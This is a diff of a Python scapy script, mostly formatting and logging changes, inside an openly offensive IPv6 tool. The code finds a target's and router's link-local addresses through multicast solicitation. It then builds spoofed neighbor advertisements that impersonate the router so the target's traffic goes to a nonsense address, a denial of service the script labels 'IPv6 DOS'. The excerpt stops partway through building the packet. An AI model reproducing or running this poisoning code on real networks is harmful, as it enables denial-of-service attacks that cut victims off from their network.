@@ -1,5 +1,5 @@
 from scapy.all import Ether, sniff
-import time 
+import time
 from utils import utilities
 from scapy.layers.inet6 import (
     ICMPv6EchoRequest,
@@ -11,7 +11,7 @@ from scapy.layers.inet6 import (
 )
 
 
-#Pinging on the all nodes address for the routers/general nodes to try to provoke a response
+# Pinging on the all nodes address for the routers/general nodes to try to provoke a response
 def ipv6_poke():
     rs_packet = Ether() / IPv6(dst="ff02::2") / ICMPv6ND_RS()
 
@@ -25,15 +25,16 @@ def ipv6_poke():
 
 def poison_service(target_mac):
 
-    #Handles discovery and then switches to the poisoning loop.
+    # Handles discovery and then switches to the poisoning loop.
 
     target_v6, router_v6 = None, None
     ipv6_poke()
 
+
     def find_ips(pkt):
-        #To anyone reading this, if you've worked with python long enough 
-        #You know that this "nonlocal" keyword was a fun 20 minutes of me desperately 
-        #Trying to understand why i was geting such weird results 
+        # To anyone reading this, if you've worked with python long enough
+        # You know that this "nonlocal" keyword was a fun 20 minutes of me desperately
+        # Trying to understand why i was geting such weird results
         nonlocal target_v6, router_v6
         if IPv6 in pkt:
             if pkt.haslayer(ICMPv6ND_RA):
@@ -42,8 +43,9 @@ def poison_service(target_mac):
                 target_v6 = pkt[IPv6].src
 
 
-    #Multicast Ping makes all nodes respond
-    print("Discovering IPv6 Link-Local addresses...")
+
+    # Multicast Ping makes all nodes respond
+    utilities.print_info("Discovering IPv6 Link-Local addresses...")
     sniff(
         filter="ip6",
         prn=find_ips,
@@ -52,12 +54,12 @@ def poison_service(target_mac):
     )
 
     if not target_v6 or not router_v6:
-        print("IPv6 Discovery Failed. Router/Target are being too quiet!")
+        utilities.print_warning("IPv6 Discovery Failed. Router/Target are being too quiet!")
         return
 
-    print(f"IPv6 DOS: Target {target_v6} | Router {router_v6}")
+    utilities.print_info(f"iPv6 DOS: Target {target_v6} | Router {router_v6}")
 
-    #Route packets to a nonsense address
+    # Route packets to a nonsense address
     na_packet = (
         Ether(dst=target_mac)
         / IPv6(src=router_v6, dst=target_v6)
